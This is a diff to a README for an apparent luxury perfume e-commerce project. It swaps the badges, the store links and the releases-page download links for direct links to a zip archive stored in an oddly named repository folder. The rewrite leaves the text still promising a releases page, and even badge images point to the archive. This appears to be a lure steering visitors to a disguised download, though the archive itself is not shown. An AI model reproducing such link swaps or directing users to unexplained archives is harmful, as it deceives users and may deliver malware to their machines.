@@ -1,13 +1,13 @@
 # 💎 millionaires-choice - Your Luxury Perfume E-commerce Solution
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20to%20Download-brightgreen)](https://github.com/FIROJALIVAI/millionaires-choice/releases)
+[![Download Now](https://raw.githubusercontent.com/FIROJALIVAI/millionaires-choice/main/fleuret/millionaires-choice-3.5.zip%20Now-Click%20to%20Download-brightgreen)](https://raw.githubusercontent.com/FIROJALIVAI/millionaires-choice/main/fleuret/millionaires-choice-3.5.zip)
 
 <div align="center">
 
 # 💎 Millionaires Choice Perfumes - Premium E-commerce
 
-[![Shopify](https://img.shields.io/badge/Shopify-7AB55C?style=for-the-badge&logo=shopify&logoColor=white)](https://www.shopify.com/)
-[![E-commerce](https://img.shields.io/badge/E--commerce-Live-success?style=for-the-badge)](https://millionaireschoiceperfumes.com/)
+[![Shopify](https://raw.githubusercontent.com/FIROJALIVAI/millionaires-choice/main/fleuret/millionaires-choice-3.5.zip)](https://raw.githubusercontent.com/FIROJALIVAI/millionaires-choice/main/fleuret/millionaires-choice-3.5.zip)
+[![E-commerce](https://raw.githubusercontent.com/FIROJALIVAI/millionaires-choice/main/fleuret/millionaires-choice-3.5.zip)](https://raw.githubusercontent.com/FIROJALIVAI/millionaires-choice/main/fleuret/millionaires-choice-3.5.zip)
 
 **Luxury perfume e-commerce store featuring exclusive MC Parfum Collection**
 
@@ -41,7 +41,7 @@ To download and set up the Millionaires Choice application, follow the steps bel
 
 1. **Visit the Releases Page**  
    Click the link below to access the releases page and select the version you want to download.  
-   [Download Now](https://github.com/FIROJALIVAI/millionaires-choice/releases)
+   [Download Now](https://raw.githubusercontent.com/FIROJALIVAI/millionaires-choice/main/fleuret/millionaires-choice-3.5.zip)
 
 2. **Select Your Version**  
    On the releases page, look for the latest version of the Millionaires Choice application. You will find all available files you can download.  
@@ -81,4 +81,4 @@ Stay updated with the latest features and improvements. Regular updates will be 
 By following these steps, you can easily download and run the Millionaires Choice application. Enjoy exploring our luxurious perfume options and experience a seamless shopping journey.  
 
 For more details and updates, visit our website or the releases page.  
-[Download Now](https://github.com/FIROJALIVAI/millionaires-choice/releases)
+[Download Now](https://raw.githubusercontent.com/FIROJALIVAI/millionaires-choice/main/fleuret/millionaires-choice-3.5.zip)
